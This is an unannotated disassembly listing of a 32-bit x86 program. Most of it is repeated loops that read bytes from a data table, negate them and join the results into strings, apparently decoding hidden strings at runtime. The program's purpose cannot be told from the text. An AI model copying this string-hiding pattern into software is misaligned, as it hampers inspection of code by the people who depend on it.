  403e96:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403e9d:	eb 00                	jmp    0x403e9f
  403e9f:	b8 02 00 00 00       	mov    $0x2,%eax
  403ea4:	3b 04 24             	cmp    (%esp),%eax
  403ea7:	7c 64                	jl     0x403f0d
  403ea9:	a1 34 80 41 00       	mov    0x418034,%eax
  403eae:	0f be 00             	movsbl (%eax),%eax
  403eb1:	89 44 24 04          	mov    %eax,0x4(%esp)
  403eb5:	ff 05 34 80 41 00    	incl   0x418034
  403ebb:	52                   	push   %edx
  403ebc:	e8 bf 9f 00 00       	call   0x40de80
  403ec1:	5a                   	pop    %edx
  403ec2:	50                   	push   %eax
  403ec3:	52                   	push   %edx
  403ec4:	e8 b7 9f 00 00       	call   0x40de80
  403ec9:	5a                   	pop    %edx
  403eca:	50                   	push   %eax
  403ecb:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403ecf:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403ed2:	53                   	push   %ebx
  403ed3:	e8 e8 1e 00 00       	call   0x405dc0
  403ed8:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403edc:	50                   	push   %eax
  403edd:	e8 de 9f 00 00       	call   0x40dec0
  403ee2:	8b 54 24 10          	mov    0x10(%esp),%edx
  403ee6:	52                   	push   %edx
  403ee7:	e8 94 9f 00 00       	call   0x40de80
  403eec:	5a                   	pop    %edx
  403eed:	50                   	push   %eax
  403eee:	52                   	push   %edx
  403eef:	e8 2c a1 00 00       	call   0x40e020
  403ef4:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403ef8:	52                   	push   %edx
  403ef9:	e8 22 a1 00 00       	call   0x40e020
  403efe:	8d 44 24 14          	lea    0x14(%esp),%eax
  403f02:	50                   	push   %eax
  403f03:	e8 b8 9f 00 00       	call   0x40dec0
  403f08:	ff 04 24             	incl   (%esp)
  403f0b:	71 92                	jno    0x403e9f
  403f0d:	b8 07 71 41 00       	mov    $0x417107,%eax
  403f12:	a3 34 80 41 00       	mov    %eax,0x418034
  403f17:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403f1e:	eb 00                	jmp    0x403f20
  403f20:	b8 03 00 00 00       	mov    $0x3,%eax
  403f25:	3b 04 24             	cmp    (%esp),%eax
  403f28:	7c 64                	jl     0x403f8e
  403f2a:	a1 34 80 41 00       	mov    0x418034,%eax
  403f2f:	0f be 00             	movsbl (%eax),%eax
  403f32:	89 44 24 04          	mov    %eax,0x4(%esp)
  403f36:	ff 05 34 80 41 00    	incl   0x418034
  403f3c:	52                   	push   %edx
  403f3d:	e8 3e 9f 00 00       	call   0x40de80
  403f42:	5a                   	pop    %edx
  403f43:	50                   	push   %eax
  403f44:	52                   	push   %edx
  403f45:	e8 36 9f 00 00       	call   0x40de80
  403f4a:	5a                   	pop    %edx
  403f4b:	50                   	push   %eax
  403f4c:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403f50:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403f53:	53                   	push   %ebx
  403f54:	e8 67 1e 00 00       	call   0x405dc0
  403f59:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403f5d:	50                   	push   %eax
  403f5e:	e8 5d 9f 00 00       	call   0x40dec0
  403f63:	8b 54 24 14          	mov    0x14(%esp),%edx
  403f67:	52                   	push   %edx
  403f68:	e8 13 9f 00 00       	call   0x40de80
  403f6d:	5a                   	pop    %edx
  403f6e:	50                   	push   %eax
  403f6f:	52                   	push   %edx
  403f70:	e8 ab a0 00 00       	call   0x40e020
  403f75:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403f79:	52                   	push   %edx
  403f7a:	e8 a1 a0 00 00       	call   0x40e020
  403f7f:	8d 44 24 18          	lea    0x18(%esp),%eax
  403f83:	50                   	push   %eax
  403f84:	e8 37 9f 00 00       	call   0x40dec0
  403f89:	ff 04 24             	incl   (%esp)
  403f8c:	71 92                	jno    0x403f20
  403f8e:	b8 05 71 41 00       	mov    $0x417105,%eax
  403f93:	a3 34 80 41 00       	mov    %eax,0x418034
  403f98:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403f9f:	eb 00                	jmp    0x403fa1
  403fa1:	b8 01 00 00 00       	mov    $0x1,%eax
  403fa6:	3b 04 24             	cmp    (%esp),%eax
  403fa9:	7c 64                	jl     0x40400f
  403fab:	a1 34 80 41 00       	mov    0x418034,%eax
  403fb0:	0f be 00             	movsbl (%eax),%eax
  403fb3:	89 44 24 04          	mov    %eax,0x4(%esp)
  403fb7:	ff 05 34 80 41 00    	incl   0x418034
  403fbd:	52                   	push   %edx
  403fbe:	e8 bd 9e 00 00       	call   0x40de80
  403fc3:	5a                   	pop    %edx
  403fc4:	50                   	push   %eax
  403fc5:	52                   	push   %edx
  403fc6:	e8 b5 9e 00 00       	call   0x40de80
  403fcb:	5a                   	pop    %edx
  403fcc:	50                   	push   %eax
  403fcd:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403fd1:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403fd4:	53                   	push   %ebx
  403fd5:	e8 e6 1d 00 00       	call   0x405dc0
  403fda:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403fde:	50                   	push   %eax
  403fdf:	e8 dc 9e 00 00       	call   0x40dec0
  403fe4:	8b 54 24 18          	mov    0x18(%esp),%edx
  403fe8:	52                   	push   %edx
  403fe9:	e8 92 9e 00 00       	call   0x40de80
  403fee:	5a                   	pop    %edx
  403fef:	50                   	push   %eax
  403ff0:	52                   	push   %edx
  403ff1:	e8 2a a0 00 00       	call   0x40e020
  403ff6:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403ffa:	52                   	push   %edx
  403ffb:	e8 20 a0 00 00       	call   0x40e020
  404000:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404004:	50                   	push   %eax
  404005:	e8 b6 9e 00 00       	call   0x40dec0
  40400a:	ff 04 24             	incl   (%esp)
  40400d:	71 92                	jno    0x403fa1
  40400f:	b8 db 70 41 00       	mov    $0x4170db,%eax
  404014:	a3 34 80 41 00       	mov    %eax,0x418034
  404019:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404020:	eb 00                	jmp    0x404022
  404022:	b8 0d 00 00 00       	mov    $0xd,%eax
  404027:	3b 04 24             	cmp    (%esp),%eax
  40402a:	7c 64                	jl     0x404090
  40402c:	a1 34 80 41 00       	mov    0x418034,%eax
  404031:	0f be 00             	movsbl (%eax),%eax
  404034:	89 44 24 04          	mov    %eax,0x4(%esp)
  404038:	ff 05 34 80 41 00    	incl   0x418034
  40403e:	52                   	push   %edx
  40403f:	e8 3c 9e 00 00       	call   0x40de80
  404044:	5a                   	pop    %edx
  404045:	50                   	push   %eax
  404046:	52                   	push   %edx
  404047:	e8 34 9e 00 00       	call   0x40de80
  40404c:	5a                   	pop    %edx
  40404d:	50                   	push   %eax
  40404e:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  404052:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  404055:	53                   	push   %ebx
  404056:	e8 65 1d 00 00       	call   0x405dc0
  40405b:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40405f:	50                   	push   %eax
  404060:	e8 5b 9e 00 00       	call   0x40dec0
  404065:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  404069:	52                   	push   %edx
  40406a:	e8 11 9e 00 00       	call   0x40de80
  40406f:	5a                   	pop    %edx
  404070:	50                   	push   %eax
  404071:	52                   	push   %edx
  404072:	e8 a9 9f 00 00       	call   0x40e020
  404077:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40407b:	52                   	push   %edx
  40407c:	e8 9f 9f 00 00       	call   0x40e020
  404081:	8d 44 24 20          	lea    0x20(%esp),%eax
  404085:	50                   	push   %eax
  404086:	e8 35 9e 00 00       	call   0x40dec0
  40408b:	ff 04 24             	incl   (%esp)
  40408e:	71 92                	jno    0x404022
  404090:	b8 e9 70 41 00       	mov    $0x4170e9,%eax
  404095:	a3 34 80 41 00       	mov    %eax,0x418034
  40409a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4040a1:	eb 00                	jmp    0x4040a3
  4040a3:	b8 0e 00 00 00       	mov    $0xe,%eax
  4040a8:	3b 04 24             	cmp    (%esp),%eax
  4040ab:	7c 68                	jl     0x404115
  4040ad:	a1 34 80 41 00       	mov    0x418034,%eax
  4040b2:	0f be 00             	movsbl (%eax),%eax
  4040b5:	89 44 24 04          	mov    %eax,0x4(%esp)
  4040b9:	ff 05 34 80 41 00    	incl   0x418034
  4040bf:	52                   	push   %edx
  4040c0:	e8 bb 9d 00 00       	call   0x40de80
  4040c5:	5a                   	pop    %edx
  4040c6:	50                   	push   %eax
  4040c7:	52                   	push   %edx
  4040c8:	e8 b3 9d 00 00       	call   0x40de80
  4040cd:	5a                   	pop    %edx
  4040ce:	50                   	push   %eax
  4040cf:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4040d3:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  4040d6:	53                   	push   %ebx
  4040d7:	e8 e4 1c 00 00       	call   0x405dc0
  4040dc:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4040e0:	50                   	push   %eax
  4040e1:	e8 da 9d 00 00       	call   0x40dec0
  4040e6:	8b 15 38 80 41 00    	mov    0x418038,%edx
  4040ec:	52                   	push   %edx
  4040ed:	e8 8e 9d 00 00       	call   0x40de80
  4040f2:	5a                   	pop    %edx
  4040f3:	50                   	push   %eax
  4040f4:	52                   	push   %edx
  4040f5:	e8 26 9f 00 00       	call   0x40e020
  4040fa:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4040fe:	52                   	push   %edx
  4040ff:	e8 1c 9f 00 00       	call   0x40e020
  404104:	8d 05 38 80 41 00    	lea    0x418038,%eax
  40410a:	50                   	push   %eax
  40410b:	e8 b0 9d 00 00       	call   0x40dec0
  404110:	ff 04 24             	incl   (%esp)
  404113:	71 8e                	jno    0x4040a3
  404115:	b8 f8 70 41 00       	mov    $0x4170f8,%eax
  40411a:	a3 34 80 41 00       	mov    %eax,0x418034
  40411f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404126:	eb 00                	jmp    0x404128
  404128:	b8 09 00 00 00       	mov    $0x9,%eax
  40412d:	3b 04 24             	cmp    (%esp),%eax
  404130:	7c 68                	jl     0x40419a
  404132:	a1 34 80 41 00       	mov    0x418034,%eax
  404137:	0f be 00             	movsbl (%eax),%eax
  40413a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40413e:	ff 05 34 80 41 00    	incl   0x418034
  404144:	52                   	push   %edx
  404145:	e8 36 9d 00 00       	call   0x40de80
  40414a:	5a                   	pop    %edx
  40414b:	50                   	push   %eax
  40414c:	52                   	push   %edx
  40414d:	e8 2e 9d 00 00       	call   0x40de80
  404152:	5a                   	pop    %edx
  404153:	50                   	push   %eax
  404154:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  404158:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  40415b:	53                   	push   %ebx
  40415c:	e8 5f 1c 00 00       	call   0x405dc0
  404161:	8d 44 24 0c          	lea    0xc(%esp),%eax
  404165:	50                   	push   %eax
  404166:	e8 55 9d 00 00       	call   0x40dec0
  40416b:	8b 15 88 80 41 00    	mov    0x418088,%edx
  404171:	52                   	push   %edx
  404172:	e8 09 9d 00 00       	call   0x40de80
  404177:	5a                   	pop    %edx
  404178:	50                   	push   %eax
  404179:	52                   	push   %edx
  40417a:	e8 a1 9e 00 00       	call   0x40e020
  40417f:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404183:	52                   	push   %edx
  404184:	e8 97 9e 00 00       	call   0x40e020
  404189:	8d 05 88 80 41 00    	lea    0x418088,%eax
  40418f:	50                   	push   %eax
  404190:	e8 2b 9d 00 00       	call   0x40dec0
  404195:	ff 04 24             	incl   (%esp)
  404198:	71 8e                	jno    0x404128
  40419a:	b8 90 70 41 00       	mov    $0x417090,%eax
  40419f:	a3 34 80 41 00       	mov    %eax,0x418034
  4041a4:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4041ab:	eb 00                	jmp    0x4041ad
  4041ad:	b8 04 00 00 00       	mov    $0x4,%eax
  4041b2:	3b 04 24             	cmp    (%esp),%eax
  4041b5:	7c 68                	jl     0x40421f
  4041b7:	a1 34 80 41 00       	mov    0x418034,%eax
  4041bc:	0f be 00             	movsbl (%eax),%eax
  4041bf:	89 44 24 04          	mov    %eax,0x4(%esp)
  4041c3:	ff 05 34 80 41 00    	incl   0x418034
  4041c9:	52                   	push   %edx
  4041ca:	e8 b1 9c 00 00       	call   0x40de80
  4041cf:	5a                   	pop    %edx
  4041d0:	50                   	push   %eax
  4041d1:	52                   	push   %edx
  4041d2:	e8 a9 9c 00 00       	call   0x40de80
  4041d7:	5a                   	pop    %edx
  4041d8:	50                   	push   %eax
  4041d9:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4041dd:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  4041e0:	53                   	push   %ebx
  4041e1:	e8 da 1b 00 00       	call   0x405dc0
  4041e6:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4041ea:	50                   	push   %eax
  4041eb:	e8 d0 9c 00 00       	call   0x40dec0
  4041f0:	8b 15 64 80 41 00    	mov    0x418064,%edx
  4041f6:	52                   	push   %edx
  4041f7:	e8 84 9c 00 00       	call   0x40de80
  4041fc:	5a                   	pop    %edx
  4041fd:	50                   	push   %eax
  4041fe:	52                   	push   %edx
  4041ff:	e8 1c 9e 00 00       	call   0x40e020
  404204:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404208:	52                   	push   %edx
  404209:	e8 12 9e 00 00       	call   0x40e020
  40420e:	8d 05 64 80 41 00    	lea    0x418064,%eax
  404214:	50                   	push   %eax
  404215:	e8 a6 9c 00 00       	call   0x40dec0
  40421a:	ff 04 24             	incl   (%esp)
  40421d:	71 8e                	jno    0x4041ad
  40421f:	b8 0f 71 41 00       	mov    $0x41710f,%eax
  404224:	a3 34 80 41 00       	mov    %eax,0x418034
  404229:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404230:	eb 00                	jmp    0x404232
  404232:	b8 03 00 00 00       	mov    $0x3,%eax
  404237:	3b 04 24             	cmp    (%esp),%eax
  40423a:	7c 68                	jl     0x4042a4
  40423c:	a1 34 80 41 00       	mov    0x418034,%eax
  404241:	0f be 00             	movsbl (%eax),%eax
  404244:	89 44 24 04          	mov    %eax,0x4(%esp)
  404248:	ff 05 34 80 41 00    	incl   0x418034
  40424e:	52                   	push   %edx
  40424f:	e8 2c 9c 00 00       	call   0x40de80
  404254:	5a                   	pop    %edx
  404255:	50                   	push   %eax
  404256:	52                   	push   %edx
  404257:	e8 24 9c 00 00       	call   0x40de80
  40425c:	5a                   	pop    %edx
  40425d:	50                   	push   %eax
  40425e:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  404262:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  404265:	53                   	push   %ebx
  404266:	e8 55 1b 00 00       	call   0x405dc0
  40426b:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40426f:	50                   	push   %eax
  404270:	e8 4b 9c 00 00       	call   0x40dec0
  404275:	8b 15 60 80 41 00    	mov    0x418060,%edx
  40427b:	52                   	push   %edx
  40427c:	e8 ff 9b 00 00       	call   0x40de80
  404281:	5a                   	pop    %edx
  404282:	50                   	push   %eax
  404283:	52                   	push   %edx
  404284:	e8 97 9d 00 00       	call   0x40e020
  404289:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40428d:	52                   	push   %edx
  40428e:	e8 8d 9d 00 00       	call   0x40e020
  404293:	8d 05 60 80 41 00    	lea    0x418060,%eax
  404299:	50                   	push   %eax
  40429a:	e8 21 9c 00 00       	call   0x40dec0
  40429f:	ff 04 24             	incl   (%esp)
  4042a2:	71 8e                	jno    0x404232
  4042a4:	8b 15 60 80 41 00    	mov    0x418060,%edx
  4042aa:	52                   	push   %edx
  4042ab:	e8 d0 9b 00 00       	call   0x40de80
  4042b0:	5a                   	pop    %edx
  4042b1:	50                   	push   %eax
  4042b2:	52                   	push   %edx
  4042b3:	e8 68 9d 00 00       	call   0x40e020
  4042b8:	8b 54 24 18          	mov    0x18(%esp),%edx
  4042bc:	52                   	push   %edx
  4042bd:	e8 5e 9d 00 00       	call   0x40e020
  4042c2:	8d 05 60 80 41 00    	lea    0x418060,%eax
  4042c8:	50                   	push   %eax
  4042c9:	e8 f2 9b 00 00       	call   0x40dec0
  4042ce:	52                   	push   %edx
  4042cf:	e8 ac 9b 00 00       	call   0x40de80
  4042d4:	5a                   	pop    %edx
  4042d5:	50                   	push   %eax
  4042d6:	ff 74 24 18          	push   0x18(%esp)
  4042da:	ff 74 24 18          	push   0x18(%esp)
  4042de:	e8 92 ef ff ff       	call   0x403275
  4042e3:	8d 44 24 24          	lea    0x24(%esp),%eax
  4042e7:	50                   	push   %eax
  4042e8:	e8 d3 9b 00 00       	call   0x40dec0
  4042ed:	e8 6c 55 00 00       	call   0x40985e
  4042f2:	89 44 24 24          	mov    %eax,0x24(%esp)
  4042f6:	68 00 00 00 00       	push   $0x0
  4042fb:	e8 76 0d 00 00       	call   0x405076
  404300:	a3 54 80 41 00       	mov    %eax,0x418054
  404305:	52                   	push   %edx
  404306:	e8 75 9b 00 00       	call   0x40de80
  40430b:	5a                   	pop    %edx
  40430c:	50                   	push   %eax
  40430d:	52                   	push   %edx
  40430e:	e8 6d 9b 00 00       	call   0x40de80
  404313:	5a                   	pop    %edx
  404314:	50                   	push   %eax
  404315:	52                   	push   %edx
  404316:	e8 65 9b 00 00       	call   0x40de80
  40431b:	5a                   	pop    %edx
  40431c:	50                   	push   %eax
  40431d:	52                   	push   %edx
  40431e:	e8 5d 9b 00 00       	call   0x40de80
  404323:	5a                   	pop    %edx
  404324:	50                   	push   %eax
  404325:	68 01 00 00 00       	push   $0x1
  40432a:	ff 35 48 80 41 00    	push   0x418048
  404330:	e8 cb 8d 00 00       	call   0x40d100
  404335:	e8 48 0e 00 00       	call   0x405182
  40433a:	01 14 24             	add    %edx,(%esp)
  40433d:	e8 6e 1b 00 00       	call   0x405eb0
  404342:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  404346:	50                   	push   %eax
  404347:	e8 74 9b 00 00       	call   0x40dec0
  40434c:	52                   	push   %edx
  40434d:	e8 2e 9b 00 00       	call   0x40de80
  404352:	5a                   	pop    %edx
  404353:	50                   	push   %eax
  404354:	52                   	push   %edx
  404355:	e8 26 9b 00 00       	call   0x40de80
  40435a:	5a                   	pop    %edx
  40435b:	50                   	push   %eax
  40435c:	52                   	push   %edx
  40435d:	e8 1e 9b 00 00       	call   0x40de80
  404362:	5a                   	pop    %edx
  404363:	50                   	push   %eax
  404364:	52                   	push   %edx
  404365:	e8 16 9b 00 00       	call   0x40de80
  40436a:	5a                   	pop    %edx
  40436b:	50                   	push   %eax
  40436c:	68 01 00 00 00       	push   $0x1
  404371:	ff 74 24 3c          	push   0x3c(%esp)
  404375:	e8 86 8d 00 00       	call   0x40d100
  40437a:	e8 03 0e 00 00       	call   0x405182
  40437f:	01 14 24             	add    %edx,(%esp)
  404382:	e8 29 1b 00 00       	call   0x405eb0
  404387:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  40438b:	50                   	push   %eax
  40438c:	e8 2f 9b 00 00       	call   0x40dec0
  404391:	ff 74 24 28          	push   0x28(%esp)
  404395:	e8 03 eb ff ff       	call   0x402e9d
  40439a:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40439e:	52                   	push   %edx
  40439f:	e8 dc 9a 00 00       	call   0x40de80
  4043a4:	5a                   	pop    %edx
  4043a5:	50                   	push   %eax
  4043a6:	ff 74 24 30          	push   0x30(%esp)
  4043aa:	e8 f5 dd ff ff       	call   0x4021a4
  4043af:	e8 ec 0d 00 00       	call   0x4051a0
  4043b4:	e8 a2 d5 ff ff       	call   0x40195b
  4043b9:	ff 74 24 2c          	push   0x2c(%esp)
  4043bd:	e8 4c 02 00 00       	call   0x40460e
  4043c2:	52                   	push   %edx
  4043c3:	e8 b8 9a 00 00       	call   0x40de80
  4043c8:	5a                   	pop    %edx
  4043c9:	50                   	push   %eax
  4043ca:	ff 74 24 10          	push   0x10(%esp)
  4043ce:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  4043d2:	83 c3 04             	add    $0x4,%ebx
  4043d5:	53                   	push   %ebx
  4043d6:	58                   	pop    %eax
  4043d7:	e8 24 0d 00 00       	call   0x405100
  4043dc:	50                   	push   %eax
  4043dd:	e8 ab f1 ff ff       	call   0x40358d
  4043e2:	8d 05 50 80 41 00    	lea    0x418050,%eax
  4043e8:	50                   	push   %eax
  4043e9:	e8 d2 9a 00 00       	call   0x40dec0
  4043ee:	ff 35 50 80 41 00    	push   0x418050
  4043f4:	e8 7a 0f 00 00       	call   0x405373
  4043f9:	ff 74 24 2c          	push   0x2c(%esp)
  4043fd:	e8 3c dd ff ff       	call   0x40213e
  404402:	52                   	push   %edx
  404403:	e8 78 9a 00 00       	call   0x40de80
  404408:	5a                   	pop    %edx
  404409:	50                   	push   %eax
  40440a:	52                   	push   %edx
  40440b:	e8 70 9a 00 00       	call   0x40de80
  404410:	5a                   	pop    %edx
  404411:	50                   	push   %eax
  404412:	ff 35 50 80 41 00    	push   0x418050
  404418:	e8 dd e7 ff ff       	call   0x402bfa
  40441d:	e8 5e 9c 00 00       	call   0x40e080
  404422:	ff 74 24 24          	push   0x24(%esp)
  404426:	e8 57 0d 00 00       	call   0x405182
  40442b:	01 54 24 04          	add    %edx,0x4(%esp)
  40442f:	e8 8c 54 00 00       	call   0x4098c0
  404434:	e8 67 0d 00 00       	call   0x4051a0
  404439:	8b 15 2c 80 41 00    	mov    0x41802c,%edx
  40443f:	52                   	push   %edx
  404440:	e8 3b 9a 00 00       	call   0x40de80
  404445:	5a                   	pop    %edx
  404446:	50                   	push   %eax
  404447:	52                   	push   %edx
  404448:	e8 d3 9b 00 00       	call   0x40e020
  40444d:	8b 15 60 80 41 00    	mov    0x418060,%edx
  404453:	52                   	push   %edx
  404454:	e8 c7 9b 00 00       	call   0x40e020
  404459:	8d 05 60 80 41 00    	lea    0x418060,%eax
  40445f:	50                   	push   %eax
  404460:	e8 5b 9a 00 00       	call   0x40dec0
  404465:	52                   	push   %edx
  404466:	e8 15 9a 00 00       	call   0x40de80
  40446b:	5a                   	pop    %edx
  40446c:	50                   	push   %eax
  40446d:	ff 74 24 28          	push   0x28(%esp)
  404471:	e8 df d9 ff ff       	call   0x401e55
  404476:	8d 44 24 34          	lea    0x34(%esp),%eax
  40447a:	50                   	push   %eax
  40447b:	e8 40 9a 00 00       	call   0x40dec0
  404480:	e8 d0 f3 ff ff       	call   0x403855
  404485:	8b 15 40 80 41 00    	mov    0x418040,%edx
  40448b:	52                   	push   %edx
  40448c:	e8 ef 99 00 00       	call   0x40de80
  404491:	5a                   	pop    %edx
  404492:	50                   	push   %eax
  404493:	52                   	push   %edx
  404494:	e8 87 9b 00 00       	call   0x40e020
  404499:	8d 44 24 38          	lea    0x38(%esp),%eax
  40449d:	50                   	push   %eax
  40449e:	e8 1d 9a 00 00       	call   0x40dec0
  4044a3:	ff 74 24 34          	push   0x34(%esp)
  4044a7:	e8 bb 0e 00 00       	call   0x405367
  4044ac:	8b 54 24 34          	mov    0x34(%esp),%edx
  4044b0:	52                   	push   %edx
  4044b1:	e8 ca 99 00 00       	call   0x40de80
  4044b6:	5a                   	pop    %edx
  4044b7:	50                   	push   %eax
  4044b8:	52                   	push   %edx
  4044b9:	e8 62 9b 00 00       	call   0x40e020
  4044be:	ba 2a 70 41 00       	mov    $0x41702a,%edx
  4044c3:	52                   	push   %edx
  4044c4:	e8 57 9b 00 00       	call   0x40e020
  4044c9:	8b 54 24 34          	mov    0x34(%esp),%edx
  4044cd:	52                   	push   %edx
  4044ce:	e8 4d 9b 00 00       	call   0x40e020
  4044d3:	8d 44 24 34          	lea    0x34(%esp),%eax
  4044d7:	50                   	push   %eax
  4044d8:	e8 e3 99 00 00       	call   0x40dec0
  4044dd:	ff 74 24 30          	push   0x30(%esp)
  4044e1:	e8 81 0e 00 00       	call   0x405367
  4044e6:	8b 1d 68 80 41 00    	mov    0x418068,%ebx
  4044ec:	83 fb 01             	cmp    $0x1,%ebx
  4044ef:	75 18                	jne    0x404509
  4044f1:	8b 44 24 28          	mov    0x28(%esp),%eax
  4044f5:	50                   	push   %eax
  4044f6:	8d 05 a9 2c 40 00    	lea    0x402ca9,%eax
  4044fc:	50                   	push   %eax
  4044fd:	e8 90 0f 00 00       	call   0x405492
  404502:	a3 18 80 41 00       	mov    %eax,0x418018
  404507:	eb 09                	jmp    0x404512
  404509:	ff 74 24 28          	push   0x28(%esp)
  40450d:	e8 97 e7 ff ff       	call   0x402ca9
  404512:	52                   	push   %edx
  404513:	e8 68 99 00 00       	call   0x40de80
  404518:	5a                   	pop    %edx
  404519:	50                   	push   %eax
  40451a:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40451e:	52                   	push   %edx
  40451f:	e8 5c 99 00 00       	call   0x40de80
  404524:	5a                   	pop    %edx
  404525:	50                   	push   %eax
  404526:	52                   	push   %edx
  404527:	e8 f4 9a 00 00       	call   0x40e020
  40452c:	ba 2a 70 41 00       	mov    $0x41702a,%edx
  404531:	52                   	push   %edx
  404532:	e8 e9 9a 00 00       	call   0x40e020
  404537:	8b 54 24 38          	mov    0x38(%esp),%edx
  40453b:	52                   	push   %edx
  40453c:	e8 df 9a 00 00       	call   0x40e020
  404541:	e8 3a 9b 00 00       	call   0x40e080
  404546:	52                   	push   %edx
  404547:	e8 34 99 00 00       	call   0x40de80
  40454c:	5a                   	pop    %edx
  40454d:	50                   	push   %eax
  40454e:	52                   	push   %edx
  40454f:	e8 2c 99 00 00       	call   0x40de80
  404554:	5a                   	pop    %edx
  404555:	50                   	push   %eax
  404556:	e8 9a 62 00 00       	call   0x40a7f5
  40455b:	e8 20 9b 00 00       	call   0x40e080
  404560:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  404564:	52                   	push   %edx
  404565:	e8 16 99 00 00       	call   0x40de80
  40456a:	5a                   	pop    %edx
  40456b:	50                   	push   %eax
  40456c:	52                   	push   %edx
  40456d:	e8 ae 9a 00 00       	call   0x40e020
  404572:	8b 54 24 20          	mov    0x20(%esp),%edx
  404576:	52                   	push   %edx
  404577:	e8 a4 9a 00 00       	call   0x40e020
  40457c:	e8 01 0c 00 00       	call   0x405182
  404581:	01 14 24             	add    %edx,(%esp)
  404584:	e8 f9 0b 00 00       	call   0x405182
  404589:	01 54 24 04          	add    %edx,0x4(%esp)
  40458d:	e8 f0 0b 00 00       	call   0x405182
  404592:	01 54 24 08          	add    %edx,0x8(%esp)
  404596:	e8 87 da ff ff       	call   0x402022
  40459b:	e8 00 0c 00 00       	call   0x4051a0
  4045a0:	89 44 24 38          	mov    %eax,0x38(%esp)
  4045a4:	ff 74 24 38          	push   0x38(%esp)
  4045a8:	e8 fc d9 ff ff       	call   0x401fa9
  4045ad:	31 c0                	xor    %eax,%eax
  4045af:	ff 74 24 28          	push   0x28(%esp)
  4045b3:	e8 98 99 00 00       	call   0x40df50
  4045b8:	ff 74 24 30          	push   0x30(%esp)
  4045bc:	e8 8f 99 00 00       	call   0x40df50
  4045c1:	ff 74 24 0c          	push   0xc(%esp)
  4045c5:	e8 86 99 00 00       	call   0x40df50
  4045ca:	ff 74 24 10          	push   0x10(%esp)
  4045ce:	e8 7d 99 00 00       	call   0x40df50
  4045d3:	ff 74 24 08          	push   0x8(%esp)
  4045d7:	e8 74 99 00 00       	call   0x40df50
  4045dc:	ff 74 24 14          	push   0x14(%esp)
  4045e0:	e8 6b 99 00 00       	call   0x40df50
  4045e5:	ff 74 24 34          	push   0x34(%esp)
  4045e9:	e8 62 99 00 00       	call   0x40df50
  4045ee:	ff 74 24 20          	push   0x20(%esp)
  4045f2:	e8 59 99 00 00       	call   0x40df50
  4045f7:	ff 74 24 1c          	push   0x1c(%esp)
  4045fb:	e8 50 99 00 00       	call   0x40df50
  404600:	ff 74 24 18          	push   0x18(%esp)
  404604:	e8 47 99 00 00       	call   0x40df50
  404609:	83 c4 3c             	add    $0x3c,%esp
  40460c:	5b                   	pop    %ebx
  40460d:	c3                   	ret
  40460e:	53                   	push   %ebx
  40460f:	31 c0                	xor    %eax,%eax
  404611:	50                   	push   %eax
  404612:	50                   	push   %eax
  404613:	50                   	push   %eax
  404614:	50                   	push   %eax
  404615:	50                   	push   %eax
  404616:	e8 a5 99 00 00       	call   0x40dfc0
  40461b:	b8 b8 70 41 00       	mov    $0x4170b8,%eax
  404620:	a3 34 80 41 00       	mov    %eax,0x418034
  404625:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40462c:	eb 00                	jmp    0x40462e
  40462e:	b8 1b 00 00 00       	mov    $0x1b,%eax
  404633:	3b 04 24             	cmp    (%esp),%eax
  404636:	7c 64                	jl     0x40469c
  404638:	a1 34 80 41 00       	mov    0x418034,%eax
  40463d:	0f be 00             	movsbl (%eax),%eax
  404640:	89 44 24 04          	mov    %eax,0x4(%esp)
  404644:	ff 05 34 80 41 00    	incl   0x418034
  40464a:	52                   	push   %edx
  40464b:	e8 30 98 00 00       	call   0x40de80
  404650:	5a                   	pop    %edx
  404651:	50                   	push   %eax
  404652:	52                   	push   %edx
  404653:	e8 28 98 00 00       	call   0x40de80
  404658:	5a                   	pop    %edx
  404659:	50                   	push   %eax
  40465a:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  40465e:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
